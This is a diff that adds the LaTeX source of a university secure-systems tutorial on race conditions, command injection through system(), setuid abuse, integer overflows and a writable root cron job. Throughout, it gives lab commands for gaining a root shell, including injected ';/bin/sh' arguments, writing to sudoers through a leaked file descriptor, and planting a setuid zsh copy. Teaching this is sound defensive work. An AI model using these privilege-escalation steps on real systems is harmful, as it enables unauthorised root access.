@@ -1,0 +1,642 @@
+\documentclass{article}
+\usepackage[top=3.1cm, bottom=3.1cm, left=2.5cm, right=2.5cm]{geometry}
+\usepackage[T1]{fontenc}
+\usepackage[utf8]{inputenc}
+\usepackage[english]{babel}
+\usepackage{graphicx}
+\usepackage[toc,page]{appendix} 
+\usepackage{eurosym}
+\usepackage{gensymb}
+\usepackage[dvipsnames]{xcolor}
+\usepackage[normal]{caption}
+\usepackage{mathtools, bm}
+\usepackage{amssymb, bm}
+%\usepackage{wrapfig}
+\usepackage{floatflt}
+\usepackage{enumitem}
+\usepackage{MnSymbol,wasysym}
+\usepackage[export]{adjustbox}
+\usepackage{float}
+\usepackage{fancyhdr}
+\pagestyle{fancy}
+\usepackage{titlesec}
+\usepackage{soul}
+\usepackage{amsmath,amsfonts,amssymb}
+\usepackage{hyperref}
+\usepackage{qtree}
+%\usepackage{chemfig}
+\usepackage{tikz}
+\usepackage{pgfplots}
+\usepackage{multicol}
+\usepackage{multirow}
+\usepackage{pgffor}
+\usepackage{qtree}
+%\usepackage{mhchem}
+%\usepackage[demo]{graphicx}
+\usepackage{subcaption}
+\usepackage{listings}
+\usepackage[squaren, Gray, cdot]{SIunits}
+\usepackage{inconsolata}
+\usepackage{minted}
+%\usepackage{syntax} %Fait planter latex pour une raison quelconque
+
+\usepackage{color}
+\definecolor{pblue}{rgb}{0.13,0.13,1}
+\definecolor{pgreen}{rgb}{0,0.5,0}
+\definecolor{pred}{rgb}{0.9,0,0}
+\definecolor{pgrey}{rgb}{0.46,0.45,0.48}
+\definecolor{mediumslateblue}{rgb}{0.48, 0.41, 0.93}
+\definecolor{electricviolet}{rgb}{0.56, 0.0, 1.0}
+
+\newcommand{\bmat}[4]{\begin{bmatrix} #1 & #2 \\ #3 & #4\end{bmatrix}}
+\newcommand{\bmatn}[9]{\begin{bmatrix} #1 & #2 & #3\\ #4 & #5 & #6 \\ #7 & #8 & #9\end{bmatrix}}
+
+\renewcommand{\labelitemii}{$\bullet$}
+\renewcommand{\labelitemiii}{$\circ$}
+%\renewcommand{\labelitemiv}{$\bullet$}
+
+
+\newcommand{\codecourse}{LINGI2144}
+\newcommand{\titlecourse}{Secured System Engineering}
+\newcommand{\othor}{\\
+\textsc{Crochet} Christophe\\
+\textsc{Duchene} Fabien\\
+\textsc{Given-Wilson} Thomas\\
+\textsc{Strebelle} Sebastien}
+\newcommand{\professor}{\textsc{Legay} Axel}
+\newcommand{\ayear}{2020 - 2021}
+\newcommand{\year}{2020}
+
+\newenvironment{Figure} %for multicols
+  {\par\medskip\noindent\minipage{\linewidth}}
+  {\endminipage\par\medskip}
+
+\usepackage{listings}
+
+\lstset{
+  basicstyle=\ttfamily,
+  keywordstyle=\color{pblue},
+  keywordstyle=[2]{\color{mediumslateblue}},
+  keywordstyle=[3]{\color{electricviolet}},
+  identifierstyle=\color{black},
+  commentstyle=\itshape\color{pgreen},
+  stringstyle=\color{pred},
+  language=Java,
+  showspaces=false,
+  showtabs=false,
+  breaklines=true,
+  showstringspaces=false,
+  breakatwhitespace=true,
+  aboveskip=0.3cm,belowskip=0.3cm,
+  mathescape=true,
+  moredelim=[il][\textcolor{pgrey}]{\$\$},
+  moredelim=[is][\textcolor{pgrey}]{\%\%}{\%\%},
+  morekeywords={then,end,type,String},
+  morekeywords=[2]{invariant,variant,var},
+  extendedchars=true,
+  literate=
+	{á}{{\'a}}1 {é}{{\'e}}1 {í}{{\'i}}1 {ó}{{\'o}}1 {ú}{{\'u}}1
+	{Á}{{\'A}}1 {É}{{\'E}}1 {Í}{{\'I}}1 {Ó}{{\'O}}1 {Ú}{{\'U}}1
+	{à}{{\`a}}1 {è}{{\`e}}1 {ì}{{\`i}}1 {ò}{{\`o}}1 {ù}{{\`u}}1
+	{À}{{\`A}}1 {È}{{\'E}}1 {Ì}{{\`I}}1 {Ò}{{\`O}}1 {Ù}{{\`U}}1
+	{ä}{{\"a}}1 {ë}{{\"e}}1 {ï}{{\"i}}1 {ö}{{\"o}}1 {ü}{{\"u}}1
+	{Ä}{{\"A}}1 {Ë}{{\"E}}1 {Ï}{{\"I}}1 {Ö}{{\"O}}1 {Ü}{{\"U}}1
+	{â}{{\^a}}1 {ê}{{\^e}}1 {î}{{\^i}}1 {ô}{{\^o}}1 {û}{{\^u}}1
+	{Â}{{\^A}}1 {Ê}{{\^E}}1 {Î}{{\^I}}1 {Ô}{{\^O}}1 {Û}{{\^U}}1
+	{œ}{{\oe}}1 {Œ}{{\OE}}1 {æ}{{\ae}}1 {Æ}{{\AE}}1 {ß}{{\ss}}1
+	{ű}{{\H{u}}}1 {Ű}{{\H{U}}}1 {ő}{{\H{o}}}1 {Ő}{{\H{O}}}1
+	{ç}{{\c c}}1 {Ç}{{\c C}}1 {ø}{{\o}}1 {å}{{\r a}}1 {Å}{{\r A}}1
+	{€}{{\EUR}}1 {£}{{\pounds}}1
+}
+\pagenumbering{roman}
+\title{\codecourse : \titlecourse}
+\author{\othor}
+\date{September \year}
+\fancyhead[R]{\codecourse}
+
+\renewcommand{\footrulewidth}{pt}
+\fancyfoot[L]{\codecourse}
+\fancyfoot[C]{Page \thepage}
+\fancyfoot[R]{\year}
+
+\newcommand{\colR}[1]{\color{red}{#1}}
+\newcommand{\colRB}[1]{\color{red}{[#1]}}
+\newcommand{\sep}{\ \wedge\ }
+
+\DeclareMathOperator{\fib}{fib}
+\DeclareMathOperator{\ok}{ok}
+\DeclareMathOperator{\abs}{abs}
+
+\pgfplotsset{compat=1.14}
+
+\begin{document}
+        \hfill\includegraphics[scale=0.5]{image/logoepl.png}
+        
+        \vspace*{\fill}
+            
+        \begin{center}
+        
+            \rule{1\textwidth}{1pt}\\
+	            \vspace{0.5\baselineskip}
+		            \begin{LARGE}
+	                	\textbf{\codecourse : \titlecourse}\\
+	                	Tutorial 1: Race conditions
+		            \end{LARGE}
+		        \vspace{0.5\baselineskip}       
+	        \rule{1\textwidth}{1pt}\\
+	        
+	        \vspace{0.5\baselineskip}
+	        
+	        \includegraphics[scale=1.5]{image/MCP.jpg}\\
+
+	        \vspace{0.5\baselineskip}
+	            Academic year : \ayear\\
+                
+		\end{center}
+		
+            \vspace*{\fill}
+            
+        \begin{tabular}{l@{\hspace{0.0cm}}r}
+        
+                \begin{minipage}{7cm}\noindent\textbf{Teacher :} \professor\\
+                \noindent\textbf{Course :} \codecourse\\
+                \noindent\textbf{Collaborators :} \othor 
+                \end{minipage}
+                &
+                
+        \end{tabular} 
+
+\newpage
+
+%\tableofcontents
+
+\newpage
+\pagenumbering{arabic}
+%\begin{itemize} //Bullet points
+%    \item [$\bullet$]
+%    \item [$\bullet$]
+%\end{itemize}
+
+%\begin{multicols}{2} //Multicolonne
+%
+%\vfill\null
+%\columnbreak
+%
+%\end{multicols}
+
+%\begin{figure}[h]
+%    \centering
+%    \includegraphics[scale = 0.7]{image/10.PNG}
+%    \caption{Titre}
+%    \label{fig:titre}
+%\end{figure}
+
+% \begin{center}
+%     \lstinline{}
+% \end{center}
+
+% \begin{itemize}
+%     \item \lstinline{}
+%     \item \lstinline{}
+%     \item \lstinline{}
+% \end{itemize}
+
+\section{Prerequisite}
+\noindent Working directory: \lstinline{~/SecurityClass/Tutorial-01}\\
+
+
+\noindent Connection:
+\begin{table}[h!]
+\centering
+\label{tab:my-table}
+\begin{tabular}{c|c}
+\textbf{username} & \textbf{password} \\ \hline
+admin          & nimda         
+\end{tabular}
+\end{table}
+
+\noindent Note that the admin user has  \lstinline{sudo} privileges and so can do anything on the system. Also that the admin user does not need to provide their password to invoke \lstinline{sudo}.\\
+
+\noindent Also note that each subsection of the tutorial has it’s own sub-directory with the
+appropriate files.
+
+
+\section{Exercise}
+\subsection{Using \lstinline{system()} \& \lstinline{SETUID} (from lecture)}
+Compile the test.c file with:
+\begin{center}
+    \lstinline{gcc -o test test.c}
+\end{center}
+\noindent Observe the behaviour of the program with
+\begin{center}
+    \lstinline{./test test.c}
+\end{center}
+\noindent See that test prints the contents of a file, here \lstinline{test.c} as specified by the
+first argument. Also see that this is achieved using \lstinline{cat} and \lstinline{system(...)}.\\
+
+
+\noindent Now let’s create a shell command with test
+\begin{center}
+    \lstinline{./test "test.c;/bin/sh"}
+\end{center}
+
+\noindent Observe that the command prompt has changed (we’re in a new \lstinline{/bin/sh} shell). Inside this shell run the command
+
+\begin{center}
+    \lstinline{whoami}
+\end{center}
+We’re still ”admin” since we were user when we ran the original command.
+Interesting, but not useful... yet. Let’s ”exit” here to get back to where we
+came from.\\
+
+\noindent Recall (from the setup) that "admin" has \lstinline{sudo} and \textbf{does not need password}, let’s exploit this!
+\begin{center}
+    \lstinline{sudo ./test "test.c;/bin/sh"}\\
+    \lstinline{whoami}
+\end{center}
+\noindent Now we’ve gained root access and a root shell. We had sudo already so this is
+not a big concern, but illustrates the mechanics of how to spawn a potentially
+vulnerable shell. Let’s return back from our shell again with "exit".\\
+
+
+\noindent Let’s make a copy of our test program called retest, make it owned by root, and have the \lstinline{SETUID} flag set.
+\begin{itemize}
+    \item \lstinline{cp test retest}
+    \item \lstinline{sudo chown root:root retest}
+    \item \lstinline{sudo chmod 4755 retest}
+\end{itemize}
+\noindent Now we can see the differences between test and retest with
+\begin{center}
+    \lstinline{ls -al}
+\end{center}
+\noindent Observe that retest has ”s” instead of ”x” for the first execution property
+and is owned by ”root root”.\\
+
+
+\noindent Now we can run the same basic command as before to see that retest
+behaves the same:
+
+\begin{center}
+    \lstinline{./retest test.c}
+\end{center}
+
+\noindent Now let’s recreate a shell command with retest
+
+\begin{center}
+    \lstinline{./retest "test.c;/bin/sh"}\\
+    \lstinline{whoami}
+\end{center}
+\noindent We are still admin... (but this may be useful later).
+
+\subsection{Spam \& Delay}
+The \lstinline{test.c} program emulates the behaviour of the linux ”cat” command in a
+naive way. Let’s look at two more simple programs to do trivial tasks, but
+that may have vulnerabilities in how they achieve their goals.\\
+
+
+\noindent The \lstinline{spam.c} code takes two arguments, the first a number and the second a string. This program then spams the string the number of times specified.\\
+
+\noindent Again we can compile this with
+
+\begin{center}
+    \lstinline{gcc -o spam spam.c}
+\end{center}
+\noindent And observe the behaviour with
+\begin{center}
+    \lstinline{./spam 5 SPAM}
+\end{center}
+\noindent Let’s look at the code for spam.c
+\begin{center}
+    \lstinline{cat spam.c}
+\end{center}
+
+\noindent\textbf{Can you find a way to exploit this code to open a shell? How might you fix the code to prevent this vulnerability?}
+\begin{itemize}
+    \item HINT: is using "\lstinline{system()}" and "\lstinline{echo}" the best way to print a string?
+\end{itemize}
+
+\noindent The second example is a simple program (\lstinline{delay.c}) to delay for a number
+of seconds (like the ”sleep” command). But it seems the developer may have
+made a poor choice in implementation.\\
+
+\noindent \textbf{Can you create the same exploit here to gain a shell? How might you fix the code to prevent this vulnerability?}
+\begin{itemize}
+    \item HINTS: Should we pass a string through? Should we use "\lstinline{system()}"?
+\end{itemize}
+
+\subsection{\lstinline{execve} exploit}
+Now let’s look at direct file descriptor manipulation (based on leakage.c from
+the lectures).\\
+
+
+\noindent Examine the code of \lstinline{fedit.c} which takes a file as an argument and allows
+you to execute a shell with access to that file’s file descriptor. We can build
+this with
+
+\begin{center}
+    \lstinline{gcc -o fedit fedit.c}
+\end{center}
+\noindent and let’s make a version for use by root
+
+\begin{itemize}
+    \item \lstinline{sudo cp fedit rootedit}
+    \item \lstinline{sudo chown root:root rootedit}
+    \item \lstinline{sudo chmod 4755 rootedit}
+\end{itemize}
+\noindent And let’s also make a copy of \lstinline{/etc/sudoers} that still belongs to root
+\begin{center}
+    \lstinline{sudo cp /etc/sudoers .}
+\end{center}
+\noindent Observe that sudoers is still not accessible to us
+\begin{itemize}
+    \item \lstinline{ls -lsa}
+    \item \lstinline{touch sudoers}
+\end{itemize}
+\noindent But let’s try out rootedit
+\begin{center}
+    \lstinline{./rootedit sudoers}
+\end{center}
+\noindent We will have the file descriptor ”fd” and then a shall. If we try to touch
+sudoers in the shall we will fail
+\begin{center}
+    \lstinline{touch sudoers}
+\end{center}
+this is because we are still ”user” as we can see with \lstinline{whoami}.\\
+
+\noindent But we can write to the file descriptor!
+\begin{center}
+    \lstinline{echo "# test" >&3}
+\end{center}
+\noindent Now let’s exit and use sudo to check the contents of sudoers
+\begin{center}
+    \lstinline{sudo cat sudoers}
+\end{center}
+\noindent We can see that we’ve written to the sudoers file without (in theory) ever
+having permission to do so. (Don’t forget to exit the sh session back to your
+normal environment here.)
+
+\begin{itemize}
+    \item \textbf{BONUS}: Create a new account on your system that does not have \lstinline{sudo} access (no entry in \lstinline{/etc/sudoers}). Use your rootedit as this user to give yourself \lstinline{sudo} privileges.
+    \item \textbf{WARNING}: Be careful here, you don’t want to accidentally break your \lstinline{/etc/sudoers} file!!
+\end{itemize} 
+
+\subsection{Integer Overflows}
+\noindent Let’s revisit signedness overflow from the lecture. Look at the code for
+\begin{center}
+    \lstinline{sign-overflow.c}
+\end{center}
+let’s compile it and test
+\begin{center}
+    \lstinline{gcc -o sign-overflow sign-overflow.c}
+\end{center}
+and run with some inputs (300, 1000, etc.)
+\begin{itemize}
+    \item HINT: try 10 000, is that what you expect ?
+\end{itemize}
+\noindent \textbf{Can you fix this?}\\
+
+
+\noindent Now that we know about this, let’s look at \lstinline{spam.c} again. \textbf{Is there somewhere here that might not behave as expected?}
+\begin{itemize}
+    \item Hint: what happens if we run?
+    \begin{itemize}
+    \item \lstinline{gcc -o spam spam.c}
+    \item \lstinline{./spam 300 "Hello"}
+\end{itemize}
+\end{itemize}
+\noindent HELP: Here you may need to know about \lstinline{Ctrl+Z} to get out of this!
+Also if you use \lstinline{Ctrl+Z} the process still exists, we can find it’s process ID (pid) and kill it with:
+\begin{center}
+    \lstinline{top -b -n 1 | grep spam}
+\end{center}
+\noindent which will show the pid as the first number on the line
+\begin{center}
+    \lstinline{kill -9 <pid>}
+\end{center}
+\noindent\textbf{Can we fix this (in addition to fixing the previous vulnerability)?}\\
+
+
+\noindent Now let’s look at \lstinline{mycat.c} which attempts to fix the bad behaviour of
+\lstinline{test.c}. Observe that for efficiency this code allows the user to specify the
+”buffer size” to read from the file. (Specifying the buffer size is more common
+in network communication, but also appears in Linux utilities like dd.)
+we can build this with
+\begin{center}
+    \lstinline{gcc -o mycat mycat.c}\\
+    \lstinline{./mycat mycat.c}
+\end{center}
+\noindent \textbf{Does this code behave properly without specifying a buffer size?}
+ \begin{itemize}
+    \item \lstinline{./mycat shortfile}
+    \item \lstinline{./mycat longfile}
+\end{itemize}
+\noindent What happens if the buffer size is specified?
+ \begin{itemize}
+    \item \lstinline{./mycat shortfile 50}
+    \item \lstinline{./mycat longfile 50}
+\end{itemize}
+\noindent \textbf{Can we break this code and crash the program?}
+\begin{itemize}
+    \item Hint: What happens if we specify a buffer size of 65536?
+\end{itemize}
+\noindent \textbf{Can we fix this code and still allow the user to specify the
+buffer size? What would be realistic buffer sizes to use on a modern
+system? Should we change the buffer size (and allocation)?}
+\begin{itemize}
+    \item HINT: See bettercat.c for some possible solutions.
+\end{itemize}
+
+\noindent \textbf{BONUS EXERCISE}: Find the error in \lstinline{bettercat.c} and fix it.
+
+
+\subsection{Race Conditions}
+Let us consider the code in race.c that creates a file and saves our secret
+password into it. Clearly the code is intended to keep the password secret
+only for us by setting the file to read/write/execute only for us. Let’s build
+this file, give it to root, and setuid it.
+ \begin{itemize}
+    \item \lstinline{gcc -o race race.c}
+    \item \lstinline{sudo chown root:root race}
+    \item \lstinline{sudo chmod 4755 race}
+    \item \lstinline{./race}
+\end{itemize}
+a file \lstinline{password.txt} has been created that we cannot read
+\begin{center}
+    \lstinline{cat password.txt}
+\end{center}
+\noindent because we don’t heave permission.\\
+
+\noindent However, if we examine the code of race.c we see that is a time after
+the password is written and before the permissions are set. Let’s use a race
+condition to quickly read the file.\\
+
+\noindent To do this we use the \lstinline{exploit.c} code that deletes the \lstinline{password.txt} file and
+then tries to read it (as many times as specified) and output the contents.
+\begin{center}
+    \lstinline{gcc -o exploit exploit.c}
+\end{center}
+
+\noindent Now we can try and use the exploit to obtain the contents of password.txt
+before the permissions are fixed. We will need two processes running at the
+same time to exploit the race condition, so in one terminal run:
+\begin{center}
+    \lstinline{while true; do ./race; done}
+\end{center}
+
+\noindent which will start to infinitely check/recreate the password.txt file.\\
+
+\noindent In another terminal run
+\begin{center}
+    \lstinline{./exploit 1000 >>result.txt}
+\end{center}
+\noindent that will try to delete and then read the \lstinline{password.txt} file 1000 times.\\
+
+\noindent If we’re lucky we should see the a mixture of ”permission denied” and
+”no such file or directory” from our exploit. Then when it finishes we can
+check the contents of \lstinline{result.txt} and find that our password has been revealed (probably a number of times).
+\begin{itemize}
+    \item NOTE: if the result.txt is empty, try running exploit with a larger argument.
+\end{itemize}
+\textbf{Can you fix race.c to not have this exploit?}
+\newpage 
+
+\subsection{Thread Race Conditions (from lecture)}
+\noindent Let us consider the code in \lstinline{threadrace.c} that creates different threads that share a common variable. The code is somewhat obfuscated to hide what it
+does, but we should be able to see the behaviour described in the lecture by
+using different compilation options.
+\begin{center}
+    \lstinline{gcc -pthread -o threadrace threadrace.c}\\
+    \lstinline{./threadrace}
+\end{center}
+\noindent We expect to see the program terminate. If you run this code many times you
+may even see different behaviours (but even a bad scheduler will probably
+always let this program terminate).\\
+
+
+\noindent However, we suspect (from the lecture since we trust Axel) that the program can reach a non-termination state if the compiler optimised too much.\\
+
+\noindent Let’s try compiling with some different optimisation options. \lstinline{gcc} has many
+compilation optimisation options, try with:
+\begin{center}
+    \lstinline{-00}\\
+    \lstinline{-01}\\
+    \lstinline{-02}\\
+    \lstinline{-03}\\
+    \lstinline{-0s}\\
+    \lstinline{-0fast}
+\end{center}
+\noindent and see which of these cause non-termination. \textbf{Are the results what you expect?}\\
+
+\noindent We can also check with another compiler and see how that behaves, let’s
+try and see how clang handles this race condition:
+\begin{center}
+    \lstinline{clang -pthread -o clangrace threadrace.c}
+\end{center}
+
+\noindent \textbf{What happens if you remove the \lstinline{*} on line 6 of the code (change from \lstinline{*i = 0;} to \lstinline{i = 0;})? Can you explain why this works?}\\
+
+\noindent \textbf{Try to simplify the code and still achieve the same race
+condition. What is the smallest example you can create that still fails to
+terminate (with the help of compiler optimisation)?}
+
+\newpage
+
+\subsection{A bad cron task}
+On a unix system, a "cron task" is a task that will automatically run at a scheduled time. These tasks are usually used to perform backups and other recurring tasks.
+
+\noindent The configuration os those tasks is stored in \lstinline{/etc/crontab} and its structure is defined this way:
+
+\begin{lstlisting}
+# ┌───────────── minute (0 - 59)
+# │ ┌───────────── hour (0 - 23)
+# │ │ ┌───────────── day of the month (1 - 31)
+# │ │ │ ┌───────────── month (1 - 12)
+# │ │ │ │ ┌───────────── day of the week (0 - 6) (Sunday=0 or 7)
+# │ │ │ │ │                                   
+# │ │ │ │ │
+# │ │ │ │ │
+# * * * * * user-name command to be executed
+\end{lstlisting}
+
+\noindent So if we want to create a task ran by the user root that runs every hour at XXh15 and is executed by root we'll add:
+\begin{center}
+    \lstinline{15 * * * * root echo "hello world"}
+\end{center}
+With this entry, the user root will execute "echo 'hello world'" every hour (at 00:15, 1:15, 2:15, 3:15, ...).\\
+
+\noindent Of course, a user can't add an entry to be executed by user "root" that would be far too easy :)\\
+
+\noindent But if you inspect the already existing cron tasks, you might find one that's executed by root and where a user is able to modify the executed file.
+If you're able to modify a file that's executed by root, you can actually add some code that will be executed by the user root.
+\begin{enumerate}
+    \item Inspect the list of cron tasks and find the tasks running as root
+    \begin{center}
+    \lstinline{cat /etc/crontab}
+    \end{center}
+    \item Check the permissions of the files executed by these tasks
+    \begin{center}
+    \lstinline{ls -laht FILE_NAME}
+    \end{center}
+    \item If you find a file you can modify as a user, you've found a security breach
+    \item Edit this file (using vi, emacs, nano, gedit..) and add some code.
+   A good idea here, could be to add code to copy the binary of a shell (for instance \lstinline{zsh;} \textbf{don't use bash}) by doing something like 
+   \begin{center}
+    \lstinline{cp /bin/zsh /bin/myzsh}
+    \end{center}
+   The copy of your shell will still belong to root. So to make it exploitable by a user, juste set the setuid flag on your copy of the shell
+   by doing something like 
+   \begin{center}
+    \lstinline{chmod +s /bin/myzsh}
+    \end{center}
+    \item The next time the cron task runs, it will execute the code you added. You should then have an executable shell (\lstinline{/bin/myzsh}) with the setuid flag set
+    \item If you run this file, it will start a shell as root (because of the setuid flag)
+    \item You now have a shell with the root privileges :) 
+\end{enumerate}
+
+
+\subsection{Finding a Target}
+We know that we can exploit the system if we can find a suitably vulnerable
+program to exploit. For this we want three things:
+\begin{itemize}
+    \item An executable owned by root
+    \item This executable has the setuid flag set
+    \item We believe this executable has a vulnerablility (e.g. bad string sanitisation, integer overflow, buffer overflow, etc.).
+\end{itemize}
+\noindent So if we can find a program with these properties we should be able to
+execute some other code that we choose as the root user, and this in turn
+will allow us to access the Target.\\
+
+\noindent Let’s see if we can find such a program somewhere on the system. We
+can do this with
+\begin{center}
+    \lstinline{find / -user root -perm /u+s -exec ls -l {} + 2>/dev/null}
+\end{center}
+
+\noindent This finds any executable owned by root that has the setuid flag set (and the \lstinline{2>/dev/null} ignores errors).\\
+
+\noindent Note that you should find several of these programs on a normal system. The next step would be to see which are vulnerable to some kind of vulnerability. This could be done in different ways, for example:
+\begin{enumerate}
+    \item Reverse engineering the binary via disassembly
+    \item run the program through a debugger to observe the behaviour and find a weak point 
+    \item analyse the source code (if available)
+    \item Fuzzing to try and find a flaw
+\end{enumerate}
+\noindent These would all take significant time and effort, but are standard work for a hacker or experienced security analyst.\\
+
+\noindent In future classes we'll look at some of these approaches and how to build and insert exploits. For now (if there is time) you can do any of the following:
+\begin{enumerate}
+    \item go back and do the bonus exercises
+    \item see if you can create an exploitable program and crash it
+    \item see if you can crash one of the programs you found above.
+\end{enumerate}
+% \begin{center}
+%     \lstinline{}
+% \end{center}
+% \begin{small}
+% \medskip
+% \bibliographystyle{IEEEtran}
+% \bibliography{bib}
+% \nocite{*}
+% \renewcommand\mkbibnamefamily[1]{\textbf{#1}}
+% \end{small}
+\end{document}
